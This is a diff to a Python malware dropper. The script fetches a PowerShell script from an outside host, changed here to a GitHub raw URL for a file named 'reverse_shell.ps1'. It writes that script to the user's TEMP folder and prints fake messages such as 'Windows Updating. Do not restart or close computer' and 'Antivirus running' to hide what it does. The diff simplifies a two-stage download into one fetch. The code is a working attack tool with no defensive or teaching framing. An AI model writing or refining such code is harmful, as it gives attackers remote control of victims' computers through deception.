@@ -6,9 +6,9 @@ import requests
 import subprocess
 import os
 import time
-
+ 
 # URL where the PowerShell script is hosted
-ps_url = 'https://tclancy.mygamesonline.org/rs'  # Replace with the actual URL of your PowerShell script
+ps_url = 'https://raw.githubusercontent.com/Issac-dev/GlitchGhost/main/reverse_shell.ps1'  # Replace with the actual URL of your PowerShell script
 
 # Fetch the PowerShell script from the server
 def send_request():
@@ -16,14 +16,12 @@ def send_request():
         response = requests.get(ps_url)
         if response.status_code == 200:
             ps_script = response.text
-            response2 = requests.get(ps_script)
-            ps_script2 = response2.text
             print('Windows Updating. Do not restart or close computer')
 
             # Save the script to a .ps1 file in the temporary directory
             ps_file_path = os.path.join(os.getenv('TEMP'), 'reverse_shell.ps1')
             with open(ps_file_path, 'w') as file:
-                file.write(ps_script2)
+                file.write(ps_script)
 
             print(f'Antivirus running')
 
